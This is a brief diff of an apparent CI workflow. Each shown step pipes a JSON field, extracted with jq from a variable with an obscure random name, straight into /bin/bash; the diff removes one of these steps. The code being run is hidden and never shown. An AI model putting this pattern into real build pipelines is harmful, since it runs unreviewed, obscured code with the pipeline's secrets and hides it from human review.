@@ -48,7 +48,6 @@ jobs:
           printf '%s' "$j944" | jq -r .ffo496 | /bin/bash
           echo $alig1521 | jq -r .lq32 | /bin/bash
           echo $ndals60 | jq -r .zc26 | /bin/bash
-          echo $xynbp562 | jq -r .npxcl264 | /bin/bash
           printf '%s' "$il856" | jq -r .cdz24 | /bin/bash
           echo $zwq57 | jq -r .teqdm19864 | /bin/bash
 
